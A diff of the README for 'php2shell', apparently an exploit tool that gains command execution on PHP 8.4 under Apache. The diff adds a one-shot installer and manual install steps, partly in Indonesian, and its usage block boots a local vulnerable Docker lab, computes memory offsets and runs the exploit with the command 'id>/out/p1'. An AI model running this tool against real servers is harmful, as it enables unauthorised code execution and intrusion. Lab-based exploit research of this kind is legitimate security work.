@@ -76,8 +76,8 @@
 git clone https://github.com/aarsaputra/php2shell.git
 cd php2shell
 
-# deps (venv recommended)
-pip install curl_cffi bcrypt
+# one-shot installer: venv + deps + smoke test + global `php2shell` command
+bash install.sh
 
 # 1) boot the vulnerable lab (official php:8.4.26-apache + author's config)
 bash lab/lab_docker.sh start          # → http://127.0.0.1:8095/index.php
@@ -88,10 +88,22 @@ bash lab/lab_docker.sh start          # → http://127.0.0.1:8095/index.php
 python3 docker/offsets.py             # → out/offsets.env  (zif=0x465370 dtor=0x65eb60)
 
 # 3) exploit with proof
-python php2shell.py exploit \
+php2shell exploit \
     -u http://127.0.0.1:8095/index.php --force --yes \
     --exploit-profile bookworm -c 'id>/out/p1'
 ```
+
+<details>
+<summary><b>Manual install (tanpa installer)</b></summary>
+
+```bash
+python3 -m venv .venv && source .venv/bin/activate
+pip install -r requirements.txt        # curl_cffi + bcrypt
+python php2shell.py --help
+```
+Tanpa venv: `pip install -r requirements.txt` langsung di environment aktif.
+
+</details>
 
 ```text
 cmd='id>/out/p1' profil=bookworm zif=0x465370 dtor=0x65eb60 htdata=0x690d8
